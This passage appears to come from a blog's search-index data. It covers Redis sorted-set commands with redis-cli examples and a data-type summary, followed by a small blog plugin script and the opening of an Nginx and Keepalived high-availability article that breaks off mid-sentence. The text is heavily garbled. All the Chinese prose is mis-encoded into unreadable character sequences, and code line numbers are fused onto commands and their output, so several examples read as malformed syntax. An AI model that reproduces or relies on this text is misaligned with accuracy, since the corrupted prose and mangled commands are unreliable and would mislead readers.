å‘½ä»¤å‚æ•°è™½ç„¶å¤šï¼Œä½†æ˜¯éƒ½å¾ˆå¥½ç†è§£ã€‚è¯¥å‘½ä»¤æŒ‰ç…§å…ƒç´ åˆ†æ•°ä»å°åˆ°å¤§çš„é¡ºåºè¿”å›åˆ†æ•°åœ¨ min å’Œ max ä¹‹é—´ï¼ˆåŒ…å« min å’Œ max ï¼‰çš„å…ƒç´ ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒZREVRANGEBYSCORE å‘½ä»¤ä¸ä»…æ˜¯æŒ‰ç…§å…ƒç´ åˆ†æ•°ä»å¤§å¾€å°çš„é¡ºåºè¾“å‡ºç»“æœï¼Œè€Œä¸”å®ƒçš„ min å’Œ max å‚æ•°çš„ä½ç½®ä¸ ZRANGEBYSCORE å‘½ä»¤æ˜¯ç›¸åçš„ã€‚ 123ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT offset count]ZREVRANGEBYSCORE key max min [WITHSCORES] [LIMIT offset count] ç¤ºä¾‹ï¼š 123456redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZRANGEBYSCORE scoreboard 80 1001) "Tom"2) "Jim" å¦‚æœå¸Œæœ›åˆ†æ•°èŒƒå›´ä¸åŒ…å«ç«¯ç‚¹å€¼ï¼Œå¯ä»¥åœ¨åˆ†æ•°å‰åŠ ä¸Š â€œ(â€ ç¬¦å·ã€‚ä¾‹å¦‚ï¼Œå¸Œæœ›è¿”å› 80 åˆ†åˆ° 100 åˆ†çš„æ•°æ®ï¼Œå¯ä»¥å« 80 åˆ†ï¼Œä½†ä¸åŒ…å« 100 åˆ†ï¼Œåˆ™å‘½ä»¤å¦‚ä¸‹ï¼š 12redis&gt; ZRANGEBYSCORE scoreboard 80 (1001) "Tom" min å’Œ max è¿˜æ”¯æŒæ— ç©·å€¼ï¼Œè¿™å’Œ ZADD å‘½ä»¤ä¸€æ ·ï¼Œå…¶ä¸­ +inf å’Œ -inf åˆ†åˆ«è¡¨ç¤ºæ­£æ— ç©·å’Œè´Ÿæ— ç©·ã€‚æ¯”å¦‚å¸Œæœ›å¾—åˆ°åˆ†æ•°é«˜äº 80 åˆ†ï¼ˆä¸åŒ…å« 80 åˆ†ï¼‰çš„äººçš„åå•ï¼Œä½†å´ä¸çŸ¥é“æœ€é«˜åˆ†æ˜¯å¤šå°‘ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ç”¨ä¸Š +infï¼š 123redis&gt; ZRANGEBYSCORE scoreboard (80 +inf1) "Tom"2) "Jim" LIMIT offset count ä¸ SQL ä¸­çš„ç”¨æ³•åŸºæœ¬ç›¸åŒï¼Œå³åœ¨è·å¾—çš„å…ƒç´ åˆ—è¡¨çš„åŸºç¡€ä¸Šå‘ååç§» offset ä¸ªå…ƒç´ ï¼Œå¹¶ä¸”åªè·å– count ä¸ªå…ƒç´ ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œè¡¨ç¤ºè·å¾—åˆ†æ•°é«˜äº 60 åˆ†çš„ï¼Œå¹¶ä»ç¬¬äºŒä¸ªäººå¼€å§‹çš„ 3 ä¸ªäººï¼š 123456789101112131415161718redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES 1) "Jerry" 2) "56" 3) "Peter" 4) "67" 5) "Yvonne" 6) "67" 7) "Tom" 8) "89" 9) "Wendy"10) "92"11) "Jim"12) "100"redis&gt; ZRANGEBYSCORE scoreboard 60 +inf LIMIT 1 31) "Yvonne"2) "Tom"3) "Wendy" å¦‚æœæƒ³è·å–åˆ†æ•°ä½äºæˆ–ç­‰äº 100 åˆ†çš„å‰ 3 ä¸ªäººï¼Œå¯ä»¥å€ŸåŠ© ZREVRANGEBYSCORE å‘½ä»¤å®ç°ã€‚ZREVRANGEBYSCORE å‘½ä»¤ä¸ä»…æ˜¯æŒ‰ç…§å…ƒç´ åˆ†æ•°ä»å¤§å¾€å°çš„é¡ºåºè¾“å‡ºç»“æœï¼Œè€Œä¸”å®ƒçš„ min å’Œ max å‚æ•°çš„ä½ç½®ä¸ ZRANGEBYSCORE å‘½ä»¤æ˜¯ç›¸åçš„ã€‚ 123456789101112131415161718redis&gt; ZREVRANGE scoreboard 0 -1 WITHSCORES 1) "Jim" 2) "100" 3) "Wendy" 4) "92" 5) "Tom" 6) "89" 7) "Yvonne" 8) "67" 9) "Peter"10) "67"11) "Jerry"12) "56"redis&gt; ZREVRANGEBYSCORE scoreboard 100 0 LIMIT 0 31) "Jim"2) "Wendy"3) "Tom" å¢å‡æŸä¸ªå…ƒç´ çš„åˆ†æ•°ZINCRBY å‘½ä»¤å¯ä»¥å¢åŠ ä¸€ä¸ªå…ƒç´ çš„åˆ†æ•°ï¼Œè¿”å›å€¼æ˜¯æ›´æ”¹åçš„åˆ†æ•°ã€‚ 1ZINCRBY key increment member ç¤ºä¾‹ï¼š 12345678redis&gt; ZSCORE scoreboard Peter"67"redis&gt; ZINCRBY scoreboard 6 Peter"73"redis&gt; ZSCORE scoreboard Peter"73" increment ä¹Ÿå¯ä»¥æ˜¯ä¸ªè´Ÿæ•°è¡¨ç¤ºå‡åˆ†ï¼Œä¾‹å¦‚ç»™ Peter å‡ 4 åˆ†ï¼š 12redis&gt; ZINCRBY scoreboard -4 Peter"69" å¦‚æœæŒ‡å®šçš„å…ƒç´ ä¸å­˜åœ¨ï¼ŒRedis åœ¨æ‰§è¡Œå‘½ä»¤å‰ä¼šå…ˆå»ºç«‹å®ƒå¹¶å°†å®ƒçš„åˆ†æ•°å€¼èµ‹ä¸º 0ï¼Œç„¶åå†æ‰§è¡Œå¢å‡æ“ä½œã€‚ è·å–é›†åˆä¸­å…ƒç´ çš„æ•°é‡1ZCARD key ç¤ºä¾‹ï¼š 12redis&gt; ZCARD scoreboard(integer) 6 è·å¾—æŒ‡å®šåˆ†æ•°èŒƒå›´å†…çš„å…ƒç´ ä¸ªæ•°ZCOUNT å‘½ä»¤çš„ min å’Œ max å‚æ•°çš„ç‰¹æ€§ä¸ ZRANGEBYSCORE å‘½ä»¤ä¸­çš„ä¸€æ ·ã€‚ 1ZCOUNT key min max ç¤ºä¾‹ï¼š 12345678910111213141516171819redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES 1) "Jerry" 2) "56" 3) "Yvonne" 4) "67" 5) "Peter" 6) "69" 7) "Tom" 8) "89" 9) "Wendy"10) "92"11) "Jim"12) "100"redis&gt; ZCOUNT scoreboard 90 100(integer) 2redis&gt; ZCOUNT scoreboard (80 +inf(integer) 3 åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ZREM å‘½ä»¤çš„è¿”å›å€¼æ˜¯æˆåŠŸåˆ é™¤çš„å…ƒç´ æ•°é‡ï¼ˆä¸åŒ…å«æœ¬æ¥å°±ä¸å­˜åœ¨çš„å…ƒç´ ï¼‰ã€‚ 1ZREM key member [member â€¦] ç¤ºä¾‹ï¼š 12345redis&gt; ZREM scoreboard Wendy(integer) 1redis&gt; ZCARD scoreboard(integer) 5 æŒ‰ç…§æ’åèŒƒå›´åˆ é™¤å…ƒç´ ZREMRANGEBYRANK å‘½ä»¤æŒ‰ç…§å…ƒç´ åˆ†æ•°ä»å°åˆ°å¤§çš„é¡ºåºï¼ˆå³ç´¢å¼• 0 è¡¨ç¤ºæœ€å°çš„å€¼ï¼‰åˆ é™¤å¤„åœ¨æŒ‡å®šæ’åèŒƒå›´å†…çš„æ‰€æœ‰å…ƒç´ ï¼Œå¹¶è¿”å›åˆ é™¤çš„å…ƒç´ æ•°é‡ã€‚ 1ZREMRANGEBYRANK key start stop ç¤ºä¾‹ï¼š 12345678910redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREMRANGEBYRANK testRem 0 2(integer) 3redis&gt; ZRANGE testRem 0 -11) "d"2) "e"3) "f" æŒ‰ç…§åˆ†æ•°èŒƒå›´åˆ é™¤å…ƒç´ ZREMRANGEBYSCORE å‘½ä»¤ä¼šåˆ é™¤æŒ‡å®šåˆ†æ•°èŒƒå›´å†…çš„æ‰€æœ‰å…ƒç´ ï¼Œå‚æ•° min å’Œ max çš„ç‰¹æ€§å’Œ ZRANGEBYSCORE å‘½ä»¤ä¸­çš„ä¸€æ ·ï¼Œè¿”å›å€¼æ˜¯åˆ é™¤çš„å…ƒç´ æ•°é‡ã€‚ 1ZREMRANGEBYSCORE key min max ç¤ºä¾‹ï¼š 123456789101112redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREMRANGEBYSCORE testRem (4 5(integer) 1redis&gt; ZRANGE testRem 0 -11) "a"2) "b"3) "c"4) "d"5) "f" è·å¾—å…ƒç´ çš„æ’å123ZRANK key memberZREVRANK key member ZRANK å‘½ä»¤ä¼šæŒ‰ç…§å…ƒç´ åˆ†æ•°ä»å°åˆ°å¤§çš„é¡ºåºè·å¾—æŒ‡å®šçš„å…ƒç´ çš„æ’åï¼ˆä» 0 å¼€å§‹ï¼Œå³åˆ†æ•°æœ€å°çš„å…ƒç´ æ’åä¸º 0ï¼‰ã€‚ 12345redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 1redis&gt; ZRANK testRem b(integer) 1 ZREVRANK å‘½ä»¤åˆ™ä¸ ZRANK å‘½ä»¤ç›¸åï¼Œåˆ†æ•°æœ€å¤§çš„å…ƒç´ æ’åä¸º 0ã€‚ 12345redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREVRANK testRem f(integer) 0 è®¡ç®—æœ‰åºé›†åˆçš„äº¤é›†ZINTERSTORE å‘½ä»¤ç”¨æ¥è®¡ç®—å¤šä¸ªæœ‰åºé›†åˆçš„äº¤é›†å¹¶å°†ç»“æœå­˜å‚¨åœ¨ destination é”®ä¸­ï¼ˆåŒæ ·ä»¥æœ‰åºé›†åˆç±»å‹å­˜å‚¨ï¼‰ï¼Œè¿”å›å€¼ä¸º destination é”®ä¸­çš„å…ƒç´ ä¸ªæ•°ï¼Œè‹¥ destination é”®å·²å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–ã€‚å…¶ä¸­ destination é”®ä¸­å…ƒç´ çš„åˆ†æ•°æ˜¯ç”± AGGREGATE å‚æ•°å†³å®šçš„ã€‚ 1ZINTERSTORE destination numkeys key [key â€¦] [WEIGHTS weight [weightâ€¦]] [AGGREGATE SUM|MIN|MAX] å½“ AGGREGATE æ˜¯ SUM æ—¶ï¼ˆä¹Ÿå°±æ˜¯é»˜è®¤å€¼ï¼‰ï¼Œdestination é”®ä¸­å…ƒç´ çš„åˆ†æ•°æ˜¯æ¯ä¸ªå‚ä¸è®¡ç®—çš„é›†åˆä¸­è¯¥å…ƒç´ åˆ†æ•°çš„å’Œã€‚ 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "11"3) "b"4) "22" å½“ AGGREGATE æ˜¯ MIN æ—¶ï¼Œdestination é”®ä¸­å…ƒç´ çš„åˆ†æ•°æ˜¯æ¯ä¸ªå‚ä¸è®¡ç®—çš„é›†åˆä¸­è¯¥å…ƒç´ åˆ†æ•°çš„æœ€å°å€¼ã€‚ 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2 AGGREGATE MIN(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "1"3) "b"4) "2" å½“ AGGREGATE æ˜¯ MAX æ—¶ï¼Œdestination é”®ä¸­å…ƒç´ çš„åˆ†æ•°æ˜¯æ¯ä¸ªå‚ä¸è®¡ç®—çš„é›†åˆä¸­è¯¥å…ƒç´ åˆ†æ•°çš„æœ€å¤§å€¼ã€‚ 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2 AGGREGATE MAX(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "10"3) "b"4) "20" è®¡ç®—æœ‰åºé›†åˆçš„å¹¶é›†ZUNIONSTORE å‘½ä»¤ç”¨äºè®¡ç®—é›†åˆé—´çš„å¹¶é›†ï¼Œä¸ ZINTERSTORE å‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•ä¸€æ ·ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ 1ZUNIONSTORE destination numkeys key [key â€¦] [WEIGHTS weight [weightâ€¦]] [AGGREGATE SUM|MIN|MAX] æ•°æ®ç±»å‹ä½¿ç”¨æ€»ç»“ æ•°æ®ç±»å‹ ç»“æ„å­˜å‚¨çš„å€¼ ç»“æ„çš„è¯»å†™èƒ½åŠ› åšå®¢ç³»ç»Ÿä¸­çš„åº”ç”¨ å­—ç¬¦ä¸²ç±»å‹ å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•´æ•°æˆ–è€…æµ®ç‚¹æ•° å¯¹æ•´ä¸ªå­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²çš„å…¶ä¸­ä¸€éƒ¨åˆ†æ‰§è¡Œæ“ä½œï¼›å¯¹æ•´æ•°å’Œæµ®ç‚¹æ•°æ‰§è¡Œè‡ªå¢æˆ–è€…è‡ªå‡æ“ä½œ ï¼ˆ1ï¼‰ åšå®¢æ–‡ç« è®¿é—®é‡ç»Ÿè®¡ï¼ˆ2ï¼‰ç”Ÿæˆè‡ªå¢ ID æ•£åˆ—ç±»å‹ åŒ…å«é”®å€¼å¯¹çš„æ— åºæ•£åˆ—è¡¨ æ·»åŠ ã€è·å–ã€ç§»é™¤å•ä¸ªé”®å€¼å¯¹ï¼›è·å–æ‰€æœ‰é”®å€¼å¯¹ ï¼ˆ1ï¼‰å­˜å‚¨æ–‡ç« æ•°æ®ï¼ˆ2ï¼‰å­˜å‚¨æ–‡ç« ç¼©ç•¥å åˆ—è¡¨ç±»å‹ ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œé“¾è¡¨ä¸Šçš„æ¯ä¸ªèŠ‚ç‚¹éƒ½åŒ…å«äº†ä¸€ä¸ªå­—ç¬¦ä¸² ä»é“¾è¡¨çš„ä¸¤ç«¯æ¨å…¥æˆ–è€…å¼¹å‡ºå…ƒç´ ï¼›æ ¹æ®åç§»é‡å¯¹é“¾è¡¨è¿›è¡Œä¿®å‰ªï¼ˆTrimï¼‰ï¼›è¯»å–å•ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼›æ ¹æ®å€¼æŸ¥æ‰¾æˆ–è€…ç§»é™¤å…ƒç´  ï¼ˆ1ï¼‰å­˜å‚¨æ–‡ç«  ID åˆ—è¡¨ï¼ˆ2ï¼‰å­˜å‚¨è¯„è®ºåˆ—è¡¨ é›†åˆç±»å‹ åŒ…å«å­—ç¬¦ä¸²çš„æ— åºæ”¶é›†å™¨ï¼Œå¹¶ä¸”è¢«åŒ…å«çš„æ¯ä¸ªå­—ç¬¦ä¸²éƒ½ä¸å¯é‡å¤ æ·»åŠ ã€è·å–ã€ç§»é™¤å•ä¸ªå…ƒç´ ï¼›æ£€æŸ¥ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨äºé›†åˆä¸­ï¼›è®¡ç®—äº¤é›†ã€å¹¶é›†ã€å·®é›†ï¼›ä»é›†åˆé‡Œé¢éšæœºè·å–å…ƒç´  ï¼ˆ1ï¼‰å­˜å‚¨æ–‡ç« æ ‡ç­¾ï¼ˆ2ï¼‰é€šè¿‡æ ‡ç­¾æœç´¢æ–‡ç«  æœ‰åºé›†åˆç±»å‹ å­—ç¬¦ä¸²æˆå‘˜ä¸æµ®ç‚¹æ•°åˆ†å€¼ä¹‹é—´çš„æœ‰åºæ˜ å°„ï¼Œå…ƒç´ çš„æ’åˆ—é¡ºåºç”±åˆ†å€¼çš„å¤§å°å†³å®š æ·»åŠ ã€è·å–ã€åˆ é™¤å•ä¸ªå…ƒç´ ï¼›æ ¹æ®åˆ†å€¼èŒƒå›´æˆ–è€…æˆå‘˜æ¥è·å–å…ƒç´  ï¼ˆ1ï¼‰å®ç°æŒ‰ç‚¹å‡»é‡æ’åºï¼ˆ2ï¼‰æ›´æ”¹æ–‡ç« å‘å¸ƒæ—¶é—´å’Œè·å¾—æŒ‡å®šæ—¶é—´èŒƒå›´å†…çš„æ–‡ç« åˆ—è¡¨ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç¼“å­˜"},{title:"Nginx + Keepalived å®ç°åŒæœºä¸»å¤‡é«˜å¯ç”¨",url:"/posts/503c34e4.html",text:'å‰è¨€è´Ÿè½½å‡è¡¡çš„å®ç° TCP å±‚å®ç°çš„è´Ÿè½½å‡è¡¡ï¼Œä¾‹å¦‚ï¼šLVSï¼ˆè°ƒåº¦æ€§èƒ½å¼ºæ‚ï¼‰ åº”ç”¨å±‚å®ç°çš„è´Ÿè½½å‡è¡¡ï¼Œä¾‹å¦‚ï¼šNginxã€Haproxyã€Apache (mod_proxy)ã€Varnishã€Squidã€Ribbon Keepalived æ¦‚è¿°Keepalived ç®€ä»‹ Keepalived æ˜¯ Linux ä¸‹ä¸€ä¸ªè½»é‡çº§åˆ«çš„é«˜å¯ç”¨å¼€æºè§£å†³æ–¹æ¡ˆï¼Œé«˜å¯ç”¨ (High Avalilability)ï¼Œå…¶å®ä¸¤ç§ä¸åŒçš„å«ä¹‰ï¼šå¹¿ä¹‰æ¥è®²ï¼Œæ˜¯æŒ‡æ•´ä¸ªç³»ç»Ÿçš„é«˜å¯ç”¨è¡Œï¼Œç‹­ä¹‰çš„æ¥è®²å°±æ˜¯ä¹‹ä¸»æœºçš„å†—ä½™å’Œæ¥ç®¡ï¼Œå®ƒä¸ HeartBeat RoseHA å®ç°ç›¸åŒç±»ä¼¼çš„åŠŸèƒ½ï¼Œéƒ½å¯ä»¥å®ç°æœåŠ¡æˆ–è€…ç½‘ç»œçš„é«˜å¯ç”¨ï¼›ä½†æ˜¯åˆæœ‰å·®åˆ«ï¼ŒHeartBeat æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ã€åŠŸèƒ½å®Œå–„çš„é«˜å¯ç”¨è½¯ä»¶ï¼Œå®ƒæä¾›äº† HA è½¯ä»¶æ‰€éœ€çš„åŸºæœ¬åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šå¿ƒè·³æ£€æµ‹ã€èµ„æºæ¥ç®¡ã€æ£€æµ‹é›†ç¾¤ä¸­çš„æœåŠ¡ã€åœ¨é›†ç¾¤èŠ‚ç‚¹è½¬ç§»å…±äº« IP åœ°å€çš„æ‰€æœ‰è€…ç­‰ç­‰ã€‚HeartBeat åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯éƒ¨ç½²å’Œä½¿ç”¨ç›¸å¯¹æ¯”è¾ƒéº»çƒ¦ï¼Œä¸ HeartBeat ç›¸æ¯”ï¼ŒKeepalived ä¸»è¦æ˜¯é€šè¿‡è™šæ‹Ÿè·¯ç”±å†—ä½™æ¥å®ç°é«˜å¯ç”¨åŠŸèƒ½ï¼Œè™½ç„¶å®ƒæ²¡æœ‰ HeartBeat åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯ Keepalived éƒ¨ç½²å’Œä½¿ç”¨éå¸¸çš„ç®€å•ï¼Œæ‰€æœ‰é…ç½®åªéœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶å³å¯ä»¥å®Œæˆã€‚Keepalived å®ç°äº†è½»é‡çº§çš„é«˜å¯ç”¨ï¼Œä¸€èˆ¬ç”¨äºå‰ç«¯é«˜å¯ç”¨ï¼Œä¸”ä¸éœ€è¦å…±äº«å­˜å‚¨ï¼Œä¸€èˆ¬å¸¸ç”¨äºä¸¤ä¸ªèŠ‚ç‚¹çš„é«˜å¯ç”¨ã€‚è€Œ Heartbeat ç”¨äºæœåŠ¡çš„é«˜å¯ç”¨ï¼Œä¸”éœ€è¦å…±äº«å­˜å‚¨ï¼Œä¸€èˆ¬ç”¨äºå¤šèŠ‚ç‚¹çš„é«˜å¯ç”¨ã€‚ Keepalived èµ·åˆæ˜¯ä¸“ä¸º LVS è®¾è®¡çš„ï¼Œç”¨æ¥ç®¡ç†å¹¶ç›‘æ§ LVS é›†ç¾¤ç³»ç»Ÿä¸­å„ä¸ªæœåŠ¡èŠ‚ç‚¹çš„çŠ¶æ€ï¼Œåæ¥åˆåŠ å…¥äº†å¯ä»¥å®ç°é«˜å¯ç”¨çš„ VRRP åŠŸèƒ½ã€‚å› æ­¤ï¼ŒKeepalived é™¤äº†èƒ½å¤Ÿç®¡ç† LVS è½¯ä»¶å¤–ï¼Œè¿˜å¯ä»¥å®ç°ä»»æ„ä¸¤å°ä¸»æœºä¹‹é—´ï¼Œä¾‹å¦‚ Master å’Œ Backup ä¸»æœºä¹‹é—´çš„æ•…éšœè½¬ç§»å’Œè‡ªåŠ¨åˆ‡æ¢ï¼Œè¿™ä¸ªä¸»æœºå¯ä»¥æ˜¯æ™®é€šçš„ä¸èƒ½åœæœºçš„ä¸šåŠ¡æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥æ˜¯ LVS è´Ÿè½½å‡è¡¡ã€Nginx åå‘ä»£ç†è¿™æ ·çš„æœåŠ¡å™¨ã€‚Keepalived è½¯ä»¶ä¸»è¦æ˜¯é€šè¿‡ VRRP åè®®å®ç°é«˜å¯ç”¨åŠŸèƒ½çš„ï¼ŒVRRP æ˜¯ Virtual Router Redundancy Protocolï¼ˆè™šæ‹Ÿè·¯ç”±å†—ä½™åè®®ï¼‰çš„ç¼©å†™ï¼ŒVRRP å‡ºç°çš„ç›®çš„å°±æ˜¯ä¸ºäº†è§£å†³é™æ€è·¯ç”±çš„å•ç‚¹æ•…éšœé—®é¢˜çš„ï¼Œå®ƒèƒ½ä¿è¯å½“ä¸ªåˆ«èŠ‚ç‚¹å®•æœºæ—¶ï¼Œæ•´ä¸ªç½‘ç»œå¯ä»¥ä¸é—´æ–­ã€ç¨³å®šåœ°è¿è¡Œã€‚æ‰€ä»¥ï¼ŒKeepalived ä¸€æ–¹é¢å…·æœ‰é…ç½®ç®¡ç† LVS çš„åŠŸèƒ½ï¼ŒåŒæ—¶è¿˜å…·æœ‰å¯¹ LVS ä¸‹é¢èŠ‚ç‚¹è¿›è¡Œå¥åº·æ£€æŸ¥çš„åŠŸèƒ½ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿå¯ä»¥å®ç°ç³»ç»Ÿç½‘ç»œæœåŠ¡çš„é«˜å¯ç”¨åŠŸèƒ½ã€‚ VRRP åè®®ä¸å·¥ä½œåŸç† åœ¨ç°å®çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œä¸»æœºä¹‹é—´çš„é€šä¿¡éƒ½æ˜¯é€šè¿‡é…ç½®é™æ€è·¯ç”±æˆ–è€… (é»˜è®¤ç½‘å…³) æ¥å®Œæˆçš„ï¼Œè€Œä¸»æœºä¹‹é—´çš„è·¯ç”±å™¨ä¸€æ—¦å‘ç”Ÿæ•…éšœï¼Œé€šä¿¡å°±ä¼šå¤±æ•ˆï¼Œå› æ­¤è¿™ç§é€šä¿¡æ¨¡å¼å½“ä¸­ï¼Œè·¯ç”±å™¨å°±æˆäº†ä¸€ä¸ªå•ç‚¹ç“¶é¢ˆï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°±å¼•å…¥äº† VRRP åè®®ï¼Œå®ƒæ˜¯ä¸€ç§ä¸»å¤‡æ¨¡å¼çš„åè®®ï¼Œé€šè¿‡ VRRP å¯ä»¥åœ¨ç½‘ç»œå‘ç”Ÿæ•…éšœæ—¶é€æ˜çš„è¿›è¡Œè®¾å¤‡åˆ‡æ¢è€Œä¸å½±å“ä¸»æœºä¹‹é—´çš„æ•°æ®é€šä¿¡ï¼Œè¿™å…¶ä¸­æ¶‰åŠåˆ°ä¸¤ä¸ªæ¦‚å¿µï¼šç‰©ç†è·¯ç”±å™¨å’Œè™šæ‹Ÿè·¯ç”±å™¨ã€‚ VRRP å¯ä»¥å°†ä¸¤å°æˆ–è€…å¤šå°ç‰©ç†è·¯ç”±å™¨è®¾å¤‡è™šæ‹Ÿæˆä¸€ä¸ªè™šæ‹Ÿè·¯ç”±ï¼Œè¿™ä¸ªè™šæ‹Ÿè·¯ç”±å™¨é€šè¿‡è™šæ‹Ÿ IPï¼ˆä¸€ä¸ªæˆ–è€…å¤šä¸ª) å¯¹å¤–æä¾›æœåŠ¡ï¼Œè€Œåœ¨è™šæ‹Ÿè·¯ç”±å™¨å†…éƒ¨åå¤šä¸ªç‰©ç†è·¯ç”±å™¨ååŒå·¥ä½œï¼ŒåŒä¸€æ—¶é—´åªæœ‰ä¸€å°ç‰©ç†è·¯ç”±å™¨å¯¹å¤–æä¾›æœåŠ¡ï¼Œè¿™å°ç‰©ç†è·¯ç”±è®¾å¤‡è¢«æˆä¸ºï¼šä¸»è·¯ç”±å™¨ï¼ˆMaster è§’è‰²)ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ Master æ˜¯ç”±é€‰ä¸¾ç®—æ³•äº§ç”Ÿï¼Œå®ƒæ‹¥æœ‰å¯¹å¤–æœåŠ¡çš„è™šæ‹Ÿ IPï¼Œæä¾›å„ç§ç½‘ç»œåŠŸèƒ½ï¼Œå¦‚ï¼šARP è¯·æ±‚ï¼ŒICMP æ•°æ®è½¬å‘ç­‰ï¼Œè€Œä¸”å…¶å®ƒçš„ç‰©ç†è·¯ç”±å™¨ä¸æ‹¥æœ‰å¯¹å¤–çš„è™šæ‹Ÿ IPï¼Œä¹Ÿä¸æä¾›å¯¹å¤–ç½‘ç»œåŠŸèƒ½ï¼Œä»…ä»…æ¥æ”¶ MASTER çš„ VRRP çŠ¶æ€é€šå‘Šä¿¡æ¯ï¼Œè¿™äº›è·¯ç”±å™¨è¢«ç»Ÿç§°ä¸º â€œBACKUP çš„è§’è‰²â€ï¼Œå½“ä¸»è·¯ç”±å™¨å¤±è´¥æ—¶ï¼Œå¤„äº BACKUP è§’è‰²çš„å¤‡ä»½è·¯ç”±å™¨å°†é‡æ–°è¿›è¡Œé€‰ä¸¾ï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„ä¸»è·¯ç”±å™¨è¿›å…¥ MASTER è§’è‰²ï¼Œç»§ç»­æä¾›å¯¹å¤–æœåŠ¡ï¼Œæ•´ä¸ªåˆ‡æ¢å¯¹ç”¨æˆ·æ¥è¯´æ˜¯å®Œå…¨é€æ˜çš„ã€‚ æ¯ä¸ªè™šæ‹Ÿè·¯ç”±å™¨éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†å·ï¼Œç§°ä¸º VRIDï¼Œä¸€ä¸ª VRID ä¸ä¸€ç»„ IP åœ°å€æ„æˆä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨ï¼Œåœ¨ VRRP åè®®ä¸­ï¼Œæ‰€æœ‰çš„æŠ¥æ–‡éƒ½æ˜¯é€šè¿‡ IP å¤šæ’­æ–¹å¼å‘é€çš„ï¼Œè€Œåœ¨ä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨ä¸­ï¼Œåªæœ‰å¤„äº Master è§’è‰²çš„è·¯ç”±å™¨ä¼šä¸€ç›´å‘é€ VRRP æ•°æ®åŒ…ï¼Œå¤„äº BACKUP è§’è‰²çš„è·¯ç”±å™¨åªä¼šæ¥å— Master è§’è‰²å‘é€è¿‡æ¥çš„æŠ¥æ–‡ä¿¡æ¯ï¼Œç”¨æ¥ç›‘æ§ Master è¿è¡ŒçŠ¶æ€ï¼Œä¸€èˆ¬ä¸ä¼šå‘ç”Ÿ BACKUP æŠ¢å çš„æƒ…å†µï¼Œé™¤éå®ƒçš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œè€Œå½“ MASTER ä¸å¯ç”¨æ—¶ï¼ŒBACKUP ä¹Ÿå°±æ— æ³•æ”¶åˆ° Master å‘è¿‡æ¥çš„ä¿¡æ¯ï¼Œäºæ˜¯å°±è®¤å®š Master å‡ºç°æ•…éšœï¼Œæ¥ç€å¤šå° BAKCUP å°±ä¼šè¿›è¡Œé€‰ä¸¾ï¼Œä¼˜å…ˆçº§æœ€é«˜çš„ BACKUP å°†ç§°ä¸ºæ–°çš„ MASTERï¼Œè¿™ç§é€‰ä¸¾è§’è‰²åˆ‡æ¢éå¸¸ä¹‹å¿«ï¼ˆ&lt; 1sï¼‰ï¼Œå› è€Œä¿è¯äº†æœåŠ¡çš„æŒç»­å¯ç”¨æ€§ã€‚ Keepalvied çš„å·¥ä½œåŸç† Keepalived é€šè¿‡ VRRP 